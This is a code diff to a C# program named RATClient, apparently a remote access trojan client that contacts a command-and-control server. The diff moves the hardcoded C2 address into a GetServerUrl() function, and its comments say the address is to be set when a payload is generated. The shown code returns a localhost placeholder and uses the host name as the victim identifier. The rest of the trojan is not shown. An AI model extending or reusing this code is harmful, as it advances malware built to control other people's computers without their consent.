@@ -5,11 +5,11 @@ using System.Net;
 using System.Net.Http;
 using System.Text;
 using System.Threading;
+using System.Windows.Forms;
 
 class RATClient
 {
-    // Constant for the C2 server URL
-    static readonly string C2_SERVER = "http://localhost:7777";
+    static string C2_SERVER = GetServerUrl(); // Dynamically get the server URL
     static string currentDir = Directory.GetCurrentDirectory();
     static string clientIdentifier = GetClientIdentifier();
     static readonly HttpClient client = new HttpClient();
@@ -161,5 +161,13 @@ class RATClient
     static string GetClientIdentifier()
     {
         return Dns.GetHostName();
+    }
+
+    static string GetServerUrl()
+    {
+        // This function gets the server URL dynamically from a config file or predefined source.
+        // For now, we just return the default value, but it can be replaced with reading a config or payload file.
+
+        return "http://localhost:7777";  // Placeholder - this should be dynamically set when the payload is generated
     }
 }
